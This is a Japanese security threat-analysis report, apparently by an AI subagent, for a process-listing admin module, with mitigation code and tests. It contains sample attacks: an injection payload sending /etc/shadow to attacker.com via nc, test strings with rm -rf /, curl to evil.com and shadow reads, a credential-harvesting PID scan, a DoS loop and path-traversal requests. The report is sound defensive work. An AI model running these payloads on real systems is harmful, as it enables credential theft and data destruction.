# Running Processes モジュール - セキュリティ脅威分析レポート

**作成日**: 2026-02-06
**作成者**: security-checker SubAgent
**対象モジュール**: Running Processes Management (Phase 2 v0.2)
**セキュリティレベル**: Medium-High（プロセス情報の機密性）

---

## 🎯 エグゼクティブサマリー

Running Processes モジュールは、**読み取り専用**のプロセス情報取得機能を提供しますが、以下の重大なセキュリティリスクが存在します：

### 🔴 重大リスク (Critical)
1. **プロセス情報漏洩** - 他ユーザーのプロセス情報（コマンドライン引数、環境変数）が露出
2. **PID Enumeration攻撃** - PID総当たりによる情報収集の可能性

### 🟡 高リスク (High)
3. **レート制限不在** - DoS攻撃（大量リクエスト）の可能性
4. **機密情報露出** - プロセス引数内のパスワード、APIキー等の露出

### 🟢 中リスク (Medium)
5. **コマンドインジェクション** - フィルタ文字列の不適切な処理
6. **パストラバーサル** - `/proc` ディレクトリの直接アクセス

---

## 📋 OWASP Top 10 (2021) との照合

| OWASP カテゴリ | 該当リスク | 深刻度 | 対策状況 |
|--------------|---------|--------|---------|
| **A01:2021 – Broken Access Control** | プロセス情報の無制限アクセス | 🔴 Critical | 未対策 |
| **A02:2021 – Cryptographic Failures** | 機密情報の平文露出 | 🟡 High | 未対策 |
| **A03:2021 – Injection** | コマンドインジェクション | 🟢 Medium | 部分対策 |
| **A04:2021 – Insecure Design** | レート制限の欠如 | 🟡 High | 未対策 |
| **A05:2021 – Security Misconfiguration** | `/proc` 直接アクセス | 🟢 Medium | 要確認 |

---

## 🔍 脅威分析（詳細）

### 1. プロセス情報漏洩（A01:2021）

#### 攻撃シナリオ
```
攻撃者: Viewer ロールのユーザー
目標: 本番環境の機密情報（DB接続情報、APIキー）を取得

ステップ:
1. GET /api/processes でプロセス一覧を取得
2. `cmdline` フィールドから以下を抽出:
   - mysql -u root -p'SecretPassword123'
   - redis-server --requirepass ApiKey12345
   - python app.py --db-url postgresql://user:pass@localhost/db
3. 取得した認証情報を悪用
```

#### 影響範囲
- **機密性**: 🔴 Critical - 全ユーザーのプロセス情報が露出
- **整合性**: ⚪ None - 読み取り専用のため直接的な改ざんなし
- **可用性**: 🟢 Low - DoS可能性あり

#### CVSS v3.1 スコア（暫定）
```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:L
Base Score: 7.1 (HIGH)
```

---

### 2. PID Enumeration 攻撃（A01:2021）

#### 攻撃シナリオ
```python
# 攻撃スクリプト例
import requests

for pid in range(1, 65536):
    response = requests.get(f"https://target/api/processes/{pid}",
                           headers=auth_headers)
    if response.status_code == 200:
        process = response.json()
        if "password" in process["cmdline"]:
            print(f"[!] Found credentials in PID {pid}: {process['cmdline']}")
```

#### 影響
- レート制限なし → 数分で全プロセスをスキャン可能
- 監査ログ肥大化（数万件のアクセスログ）
- サーバー負荷（I/O、CPU）

---

### 3. レート制限不在（A04:2021）

#### 攻撃シナリオ
```bash
# DoS 攻撃例
while true; do
    curl -H "Authorization: Bearer $TOKEN" \
         https://target/api/processes?filter=nginx &
done
```

#### 影響
- APIサーバーのCPU/メモリ枯渇
- 監査ログストレージ枯渇
- 正規ユーザーのサービス拒否

---

### 4. 機密情報露出（A02:2021）

#### 露出する可能性のある情報
```json
{
  "pid": 1234,
  "cmdline": [
    "mysql",
    "-u", "root",
    "-pSuperSecretPassword",  // ← 露出
    "--host=db.internal.corp"  // ← 内部ホスト名も露出
  ],
  "environ": {  // ← 環境変数も露出
    "DB_PASSWORD": "SecretPass123",
    "AWS_SECRET_ACCESS_KEY": "wJalrXUtn..."
  }
}
```

#### CWE 分類
- **CWE-200**: Exposure of Sensitive Information to an Unauthorized Actor
- **CWE-532**: Insertion of Sensitive Information into Log File

---

### 5. コマンドインジェクション（A03:2021）

#### 攻撃ベクトル

**現在の実装想定**:
```python
# 危険な実装例（絶対に実装してはいけない）
filter_str = request.args.get("filter")
cmd = f"ps aux | grep {filter_str}"  # ← CRITICAL VIOLATION
subprocess.run(cmd, shell=True)  # ← shell=True 禁止
```

**攻撃ペイロード**:
```
GET /api/processes?filter=nginx; cat /etc/shadow | nc attacker.com 1234
```

#### 対策
- **CLAUDE.md Section 3.3** 準拠: `shell=True` の全面禁止
- 特殊文字の厳格な検証（FORBIDDEN_CHARS）
- ラッパースクリプト内で引数をサニタイズ

---

### 6. パストラバーサル（A05:2021）

#### 攻撃ベクトル
```
GET /api/processes/../../../etc/passwd
GET /api/processes?filter=../../root/.ssh/id_rsa
```

#### 影響
- `/proc` 以外のファイルシステムへのアクセス
- システムファイルの読み取り

---

## 🛡️ セキュリティ要件定義

### 1. 入力バリデーション（必須）

#### PID 検証
```python
from pydantic import BaseModel, Field, field_validator

class ProcessPIDRequest(BaseModel):
    pid: int = Field(ge=1, le=4194304, description="プロセスID")

    @field_validator('pid')
    @classmethod
    def validate_pid(cls, v: int) -> int:
        """PID の範囲検証"""
        if v < 1:
            raise ValueError("PID must be positive")

        # Linux の最大PID（/proc/sys/kernel/pid_max）
        max_pid = 4194304
        if v > max_pid:
            raise ValueError(f"PID exceeds maximum ({max_pid})")

        return v
```

#### フィルタ文字列検証（CLAUDE.md 準拠）
```python
import re

FORBIDDEN_CHARS = [";", "|", "&", "$", "(", ")", "`", ">", "<", "*", "?", "{", "}", "[", "]", "\n", "\r"]

class ProcessFilterRequest(BaseModel):
    filter: str = Field(max_length=100, description="フィルタ文字列")

    @field_validator('filter')
    @classmethod
    def validate_filter(cls, v: str) -> str:
        """フィルタ文字列のセキュリティ検証"""
        # 特殊文字チェック（CLAUDE.md Section 6.2）
        for char in FORBIDDEN_CHARS:
            if char in v:
                raise ValueError(f"Forbidden character detected: {char}")

        # 英数字、ハイフン、アンダースコア、ドットのみ許可
        if not re.match(r'^[a-zA-Z0-9\-_.]+$', v):
            raise ValueError("Filter contains invalid characters")

        return v
```

---

### 2. 監査ログ要件

#### 必須記録項目
```python
audit_entry = {
    "timestamp": "2026-02-06T12:34:56Z",
    "user_id": "operator@example.com",
    "user_role": "Operator",
    "operation": "process_list",  # または process_detail
    "target": "all" または f"pid:{pid}",
    "filter": filter_str,  # フィルタ文字列（検証済み）
    "result_count": 42,  # 返却したプロセス数
    "status": "success",
    "client_ip": "192.168.1.100",  # レート制限用
    "response_time_ms": 123
}
```

---

### 3. レート制限要件

#### 推奨設定
```yaml
rate_limits:
  processes_list:
    per_user: 60 req/min  # 1秒に1回
    per_ip: 100 req/min
    burst: 10

  processes_detail:
    per_user: 120 req/min  # 1秒に2回
    per_ip: 200 req/min
    burst: 20
```

#### 実装例（FastAPI + slowapi）
```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@router.get("/processes")
@limiter.limit("60/minute")
async def list_processes(request: Request, ...):
    ...
```

---

### 4. アクセス制御（RBAC）

#### ロール別権限マトリクス

| ロール | プロセス一覧 | プロセス詳細 | 他ユーザーのプロセス | 機密情報フィールド |
|--------|----------|----------|--------------|---------------|
| **Viewer** | ✅ 許可 | ✅ 許可 | ❌ 拒否 | ❌ 拒否 |
| **Operator** | ✅ 許可 | ✅ 許可 | ⚠️ 限定許可 | ❌ 拒否 |
| **Approver** | ✅ 許可 | ✅ 許可 | ✅ 許可 | ⚠️ マスク |
| **Admin** | ✅ 許可 | ✅ 許可 | ✅ 許可 | ✅ 許可 |

#### 機密情報フィールドの定義
```python
SENSITIVE_FIELDS = [
    "environ",      # 環境変数全体
    "cmdline",      # コマンドライン引数（マスク処理）
    "open_files",   # オープンファイル一覧
    "connections"   # ネットワーク接続
]
```

#### 機密情報のマスク処理
```python
def mask_sensitive_cmdline(cmdline: list[str], user_role: str) -> list[str]:
    """コマンドライン引数のマスク処理"""
    if user_role == "Admin":
        return cmdline  # Admin は全て表示

    masked = []
    for arg in cmdline:
        # パスワード、トークン、キーを検出
        if any(keyword in arg.lower() for keyword in
               ["password", "passwd", "token", "key", "secret", "auth"]):
            masked.append("***REDACTED***")
        else:
            masked.append(arg)

    return masked
```

---

### 5. Wrapper スクリプト設計

#### `/usr/local/sbin/adminui-processes.sh`

```bash
#!/bin/bash
# adminui-processes.sh - プロセス情報取得ラッパー
#
# 用途: 安全なプロセス情報取得
# 権限: root 権限不要（ps コマンドは一般ユーザーでも実行可能）
# 呼び出し: sudo /usr/local/sbin/adminui-processes.sh [list|detail] [PID|filter]

set -euo pipefail

# ログ出力
log() {
    logger -t adminui-processes -p user.info "$*"
    echo "[$(date -Iseconds)] $*" >&2
}

error() {
    logger -t adminui-processes -p user.err "ERROR: $*"
    echo "[$(date -Iseconds)] ERROR: $*" >&2
    echo "{\"status\": \"error\", \"message\": \"$*\"}" >&1
    exit 1
}

# 引数チェック
if [ $# -lt 1 ]; then
    error "Usage: $0 [list|detail] [PID|filter]"
fi

COMMAND="$1"

case "$COMMAND" in
    list)
        # プロセス一覧取得
        FILTER="${2:-}"

        # フィルタ検証（特殊文字チェック）
        if [[ "$FILTER" =~ [';|&$(){}[\]`<>*?] ]]; then
            error "Invalid filter: forbidden characters detected"
        fi

        log "Process list requested with filter: $FILTER"

        # ps コマンド実行（配列渡し、shell展開なし）
        if [ -z "$FILTER" ]; then
            ps aux --no-headers | awk '{print $2, $1, $3, $4, $11}' | \
                jq -R -s 'split("\n")[:-1] | map(split(" ") | {pid: .[0], user: .[1], cpu: .[2], mem: .[3], name: .[4]})'
        else
            ps aux --no-headers | grep -F "$FILTER" | awk '{print $2, $1, $3, $4, $11}' | \
                jq -R -s 'split("\n")[:-1] | map(split(" ") | {pid: .[0], user: .[1], cpu: .[2], mem: .[3], name: .[4]})'
        fi
        ;;

    detail)
        # プロセス詳細取得
        PID="${2:-}"

        # PID 検証（数字のみ）
        if ! [[ "$PID" =~ ^[0-9]+$ ]]; then
            error "Invalid PID: must be numeric"
        fi

        # PID 範囲チェック（1 ~ 4194304）
        if [ "$PID" -lt 1 ] || [ "$PID" -gt 4194304 ]; then
            error "Invalid PID: out of range"
        fi

        # プロセス存在チェック
        if ! kill -0 "$PID" 2>/dev/null; then
            error "Process not found: PID $PID"
        fi

        log "Process detail requested for PID: $PID"

        # プロセス情報を JSON で出力
        # 注意: cmdline と environ は機密情報を含む可能性があるため、
        #       バックエンド側でマスク処理を実施すること
        cat <<EOF
{
  "pid": $PID,
  "name": "$(ps -p "$PID" -o comm= 2>/dev/null || echo "unknown")",
  "cmdline": $(tr '\0' ' ' < "/proc/$PID/cmdline" 2>/dev/null | jq -R 'split(" ")' || echo "[]"),
  "status": "$(awk '/^State:/ {print $2}' "/proc/$PID/status" 2>/dev/null || echo "unknown")",
  "cpu_percent": $(ps -p "$PID" -o %cpu= 2>/dev/null || echo "0.0"),
  "mem_percent": $(ps -p "$PID" -o %mem= 2>/dev/null || echo "0.0"),
  "user": "$(ps -p "$PID" -o user= 2>/dev/null || echo "unknown")",
  "start_time": "$(ps -p "$PID" -o lstart= 2>/dev/null || echo "unknown")"
}
EOF
        ;;

    *)
        error "Unknown command: $COMMAND"
        ;;
esac

log "Process operation completed successfully"
exit 0
```

---

## ✅ セキュリティチェックリスト（実装レビュー用）

### Phase 1: 設計レビュー（@arch-reviewer）

- [ ] **アクセス制御設計**: RBAC マトリクス定義済み
- [ ] **入力検証設計**: PID, フィルタの検証ルール定義済み
- [ ] **レート制限設計**: ユーザー/IP単位のレート制限設計済み
- [ ] **監査ログ設計**: 記録項目、保管期間、アクセス権限定義済み
- [ ] **機密情報マスク設計**: cmdline, environ のマスクロジック設計済み

### Phase 2: コード実装（@code-implementer）

#### Backend（Python）

- [ ] **Pydantic モデル**: `FORBIDDEN_CHARS` 検証実装済み
- [ ] **shell=True 禁止**: `grep -r "shell=True"` でゼロ件
- [ ] **os.system 禁止**: `grep -r "os.system"` でゼロ件
- [ ] **eval/exec 禁止**: `grep -r "\b(eval|exec)\s*\("` でゼロ件
- [ ] **レート制限実装**: `slowapi` または同等ライブラリ使用
- [ ] **RBAC 実装**: ロール別アクセス制御実装済み
- [ ] **監査ログ**: 全操作を `audit_log.record()` で記録
- [ ] **機密情報マスク**: `mask_sensitive_cmdline()` 実装済み

#### Wrapper（Bash）

- [ ] **set -euo pipefail**: スクリプト冒頭で必須設定
- [ ] **引数検証**: PID, フィルタの検証実装済み
- [ ] **特殊文字チェック**: `[[ $VAR =~ [';|&$()...] ]]` 実装済み
- [ ] **bash -c 禁止**: `grep -r "bash -c"` でゼロ件
- [ ] **配列渡し**: `ps "${ARGS[@]}"` 形式で実装
- [ ] **ログ記録**: `logger -t adminui-processes` で記録

### Phase 3: セキュリティテスト（@test-designer）

- [ ] **コマンドインジェクション**: 15+ テストケース実装
- [ ] **PID バリデーション**: 境界値テスト（0, 1, max, max+1）
- [ ] **フィルタ検証**: 全 FORBIDDEN_CHARS テスト
- [ ] **レート制限**: 閾値超過テスト実装
- [ ] **RBAC**: 各ロールのアクセス権限テスト
- [ ] **監査ログ**: ログ記録・検索テスト
- [ ] **機密情報マスク**: マスク処理の正確性テスト

### Phase 4: 継続的セキュリティレビュー（@security-checker）

- [ ] **並列レビュー**: 実装と同時にコードレビュー実施
- [ ] **禁止パターン検出**: CI/CD で自動検出（shell=True 等）
- [ ] **Bandit スキャン**: `bandit -r backend/ -ll`
- [ ] **ShellCheck**: `shellcheck wrappers/adminui-processes.sh`
- [ ] **カバレッジ確認**: セキュリティテスト 90%+ カバレッジ

---

## 🧪 セキュリティテストケース仕様

### 1. コマンドインジェクションテスト

```python
# tests/security/test_processes_security.py

import pytest
from backend.api.routes.processes import ProcessFilterRequest

class TestProcessesCommandInjection:
    """プロセスモジュールのコマンドインジェクションテスト"""

    @pytest.mark.parametrize("malicious_filter", [
        "nginx; rm -rf /",
        "nginx | nc attacker.com 1234",
        "nginx & whoami",
        "nginx $(cat /etc/shadow)",
        "nginx `id`",
        "nginx > /tmp/hacked",
        "nginx < /etc/passwd",
        "nginx && ls -la /root",
        "nginx || curl http://evil.com",
        "nginx; cat /etc/shadow | base64",
    ])
    def test_reject_command_injection_in_filter(self, malicious_filter):
        """フィルタ文字列のコマンドインジェクション拒否"""
        with pytest.raises(ValueError):
            ProcessFilterRequest(filter=malicious_filter)

    @pytest.mark.parametrize("forbidden_char", [";", "|", "&", "$", "(", ")", "`", ">", "<", "*", "?", "{", "}", "[", "]"])
    def test_reject_each_forbidden_char(self, forbidden_char):
        """FORBIDDEN_CHARS 各文字の拒否"""
        malicious_filter = f"nginx{forbidden_char}ls"
        with pytest.raises(ValueError, match="Forbidden character"):
            ProcessFilterRequest(filter=malicious_filter)

    def test_accept_safe_filter(self):
        """安全なフィルタ文字列の許可"""
        safe_filters = ["nginx", "postgresql-12", "python3.9", "node_app"]
        for filter_str in safe_filters:
            request = ProcessFilterRequest(filter=filter_str)
            assert request.filter == filter_str
```

### 2. PID バリデーションテスト

```python
class TestProcessesPIDValidation:
    """PID 検証テスト"""

    @pytest.mark.parametrize("invalid_pid", [-1, 0, 4194305, 999999999])
    def test_reject_invalid_pid(self, invalid_pid):
        """無効なPIDの拒否"""
        with pytest.raises(ValueError):
            ProcessPIDRequest(pid=invalid_pid)

    @pytest.mark.parametrize("valid_pid", [1, 100, 1000, 4194304])
    def test_accept_valid_pid(self, valid_pid):
        """有効なPIDの許可"""
        request = ProcessPIDRequest(pid=valid_pid)
        assert request.pid == valid_pid
```

### 3. レート制限テスト

```python
class TestProcessesRateLimit:
    """レート制限テスト"""

    def test_rate_limit_exceeded(self, test_client, auth_headers):
        """レート制限超過時のエラー"""
        # 60回連続リクエスト
        for i in range(60):
            response = test_client.get("/api/processes", headers=auth_headers)

        # 61回目で429エラー
        response = test_client.get("/api/processes", headers=auth_headers)
        assert response.status_code == 429
        assert "rate limit" in response.json()["detail"].lower()
```

### 4. RBAC テスト

```python
class TestProcessesRBAC:
    """RBAC テスト"""

    def test_viewer_cannot_see_sensitive_fields(self, test_client, viewer_headers):
        """Viewer は機密フィールドを閲覧不可"""
        response = test_client.get("/api/processes/1234", headers=viewer_headers)

        assert response.status_code == 200
        process = response.json()

        # 機密フィールドが存在しない、またはマスク済み
        assert "environ" not in process
        assert all("***REDACTED***" in arg or "password" not in arg.lower()
                   for arg in process.get("cmdline", []))

    def test_admin_can_see_all_fields(self, test_client, admin_headers):
        """Admin は全フィールド閲覧可能"""
        response = test_client.get("/api/processes/1234", headers=admin_headers)

        assert response.status_code == 200
        process = response.json()

        # 全フィールドが存在（マスクなし）
        assert "cmdline" in process
        # environ は慎重に扱うため、実装次第で含める
```

### 5. 監査ログテスト

```python
class TestProcessesAuditLog:
    """監査ログテスト"""

    def test_audit_log_on_process_list(self, test_client, auth_headers, audit_log):
        """プロセス一覧取得時の監査ログ記録"""
        response = test_client.get("/api/processes?filter=nginx", headers=auth_headers)

        assert response.status_code == 200

        # 監査ログ確認
        logs = audit_log.query(user_role="Admin", requesting_user_id="admin@example.com",
                               operation="process_list", limit=1)
        assert len(logs) == 1
        assert logs[0]["target"] == "all"
        assert logs[0]["filter"] == "nginx"
        assert logs[0]["status"] == "success"
```

---

## 🚨 人間承認必須ポイント（CRITICAL）

以下の変更は**必ず人間による明示的な承認**を得てから実装すること：

### 1. sudoers 関連
- ❗ `adminui-processes.sh` の sudoers 追加（読み取り専用でも確認必須）
- ❗ sudo 実行の必要性の再評価（`ps` は一般ユーザーでも実行可能）

### 2. 機密情報の扱い
- ❗ `environ` フィールドの出力可否
- ❗ `cmdline` のマスクルール
- ❗ Admin ロールの機密情報アクセス範囲

### 3. レート制限の緩和
- ❗ レート制限の閾値変更（60 req/min → より高い値）
- ❗ レート制限の無効化（開発環境でも慎重に）

### 4. RBAC の変更
- ❗ Viewer ロールへの機密情報アクセス付与
- ❗ 新規ロールの追加

---

## 📊 リスクマトリクス

| リスク | 発生確率 | 影響度 | リスクレベル | 優先度 |
|--------|---------|--------|------------|-------|
| プロセス情報漏洩 | 🟡 Medium | 🔴 Critical | 🔴 High | P1 |
| PID Enumeration | 🟢 Low | 🟡 High | 🟡 Medium | P2 |
| レート制限不在 | 🟡 Medium | 🟡 High | 🟡 Medium | P2 |
| 機密情報露出 | 🟡 Medium | 🔴 Critical | 🔴 High | P1 |
| コマンドインジェクション | 🟢 Low | 🔴 Critical | 🟡 Medium | P2 |
| パストラバーサル | 🟢 Low | 🟡 High | 🟢 Low | P3 |

---

## 🎯 推奨アクションプラン

### Phase 1: 設計強化（即時）
1. RBAC マトリクスの明確化
2. 機密情報マスク仕様の確定
3. レート制限閾値の決定
4. 監査ログ要件の最終化

### Phase 2: 実装（必須セキュリティ対策）
1. 入力検証の厳格化（FORBIDDEN_CHARS 準拠）
2. レート制限の実装
3. 機密情報マスク処理の実装
4. 監査ログの実装

### Phase 3: テスト（品質保証）
1. セキュリティテスト 15+ ケース実装
2. カバレッジ 90%+ 達成
3. Bandit, ShellCheck 全パス

### Phase 4: 継続的監視
1. CI/CD でのセキュリティチェック自動化
2. 監査ログの定期レビュー
3. 脆弱性スキャンの定期実行

---

## 📚 参照ドキュメント

- [CLAUDE.md](../../CLAUDE.md) - セキュリティ原則
- [SECURITY.md](../../SECURITY.md) - セキュリティポリシー
- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [Linux /proc filesystem](https://www.kernel.org/doc/html/latest/filesystems/proc.html)

---

**最終更新**: 2026-02-06
**次回レビュー**: 実装完了後、即座にコードレビュー実施

---

## 🔐 security-checker の宣言

本レポートに基づき、Running Processes モジュールの実装全体を継続的にレビューし、以下を保証します：

- ✅ CLAUDE.md セキュリティ原則への完全準拠
- ✅ OWASP Top 10 への対策実施
- ✅ 禁止パターン（shell=True 等）のゼロ検出
- ✅ セキュリティテストカバレッジ 90%+ 達成

**並列レビューコミットメント**: 他のSubAgentが実装を開始した時点で、即座に並列レビューを開始し、セキュリティ違反を検出次第、即座に指摘・停止します。
